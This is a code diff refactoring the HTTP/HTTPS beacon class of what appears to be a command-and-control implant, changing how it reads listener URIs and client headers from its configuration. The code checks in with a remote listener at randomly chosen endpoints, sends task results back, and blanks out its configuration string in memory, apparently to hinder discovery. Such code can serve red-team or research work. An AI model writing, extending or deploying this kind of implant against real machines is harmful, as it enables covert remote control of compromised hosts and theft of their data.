@@ -313,12 +313,23 @@ string HttpsWebRequestGet(const string& domain, int port, const string& url, con
 
 
 BeaconHttp::BeaconHttp(std::string& config, std::string& ip, int port, bool isHttps)
-	: Beacon(ip, port)
+	: Beacon()
     , m_isHttps(isHttps)
 {
     srand(time(NULL));
 
-    m_beaconHttpConfig = nlohmann::json::parse(config);
+    m_ip = ip;
+    m_port = port;
+
+    // Http communcation config
+    nlohmann::json configJson = nlohmann::json::parse(config);
+    if(isHttps)
+        m_beaconHttpConfig = configJson["ListenerHttpsConfig"];
+    else
+        m_beaconHttpConfig = configJson["ListenerHttpConfig"];
+
+    // beacon and modules config
+    initConfig(config);
     
     for(int i=0; i<config.size(); i++)
         config[i]='.';
@@ -343,10 +354,10 @@ void BeaconHttp::checkIn()
         std::string output;
         taskResultsToCmd(output);
 
-        nlohmann::json httpsUri = m_beaconHttpConfig["ListenerHttpsConfig"][0]["uri"];
+        nlohmann::json httpsUri = m_beaconHttpConfig["uri"];
         std::string endPoint = httpsUri[ rand() % httpsUri.size() ];
 
-        nlohmann::json httpHeaders = m_beaconHttpConfig["ListenerHttpsConfig"][0]["client"][0]["headers"][0];
+        nlohmann::json httpHeaders = m_beaconHttpConfig["client"]["headers"];
 
         httplib::Headers httpClientHeaders;
         for (auto& it : httpHeaders.items())
@@ -371,10 +382,10 @@ void BeaconHttp::checkIn()
         std::string output;
         taskResultsToCmd(output);
 
-        nlohmann::json httpUri = m_beaconHttpConfig["ListenerHttpConfig"][0]["uri"];
+        nlohmann::json httpUri = m_beaconHttpConfig["uri"];
         std::string endPoint = httpUri[ rand() % httpUri.size() ];
 
-        nlohmann::json httpHeaders = m_beaconHttpConfig["ListenerHttpConfig"][0]["client"][0]["headers"][0];
+        nlohmann::json httpHeaders = m_beaconHttpConfig["client"]["headers"];
 
         httplib::Headers httpClientHeaders;
         for (auto& it : httpHeaders.items())
@@ -400,12 +411,12 @@ void BeaconHttp::checkIn()
 
     if(m_isHttps)
     {
-        auto httpsUri = m_beaconHttpConfig["ListenerHttpsConfig"][0]["uri"];
+        auto httpsUri = m_beaconHttpConfig["uri"];
         endPoint = httpsUri[ rand() % httpsUri.size() ];
     }
     else
     {
-        auto httpUri = m_beaconHttpConfig["ListenerHttpConfig"][0]["uri"];
+        auto httpUri = m_beaconHttpConfig["uri"];
         endPoint = httpUri[ rand() % httpUri.size() ];
     }
 
@@ -414,9 +425,9 @@ void BeaconHttp::checkIn()
 
     nlohmann::json httpHeaders;
     if(!m_isHttps)
-        httpHeaders = m_beaconHttpConfig["ListenerHttpConfig"][0]["client"][0]["headers"][0];
+        httpHeaders = m_beaconHttpConfig["client"]["headers"];
     else 
-        httpHeaders = m_beaconHttpConfig["ListenerHttpsConfig"][0]["client"][0]["headers"][0];
+        httpHeaders = m_beaconHttpConfig["client"]["headers"];
 
     // TODO put a rule to know when do post and when we do get
     bool isPost=true;
